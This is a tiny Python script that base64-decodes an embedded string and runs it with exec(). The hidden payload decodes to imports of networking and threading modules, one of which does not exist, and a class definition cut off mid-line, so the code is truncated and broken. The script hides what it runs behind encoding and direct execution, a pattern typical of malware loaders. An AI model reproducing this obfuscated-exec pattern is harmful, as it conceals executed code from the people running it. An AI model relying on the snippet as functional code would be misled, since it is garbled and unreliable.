#incoded by devil
import base64

# The Base64 encoded string
encoded_string = 'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGh0dHBfc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKCmNsYXNzIE15SGFuZGxlciBodHRwLnNlcnZlci5TaW1wbGU='

# Decode the string
decoded_code = base64.b64decode(encoded_string).decode('utf-8')

# Execute the decoded code
exec(decoded_code)
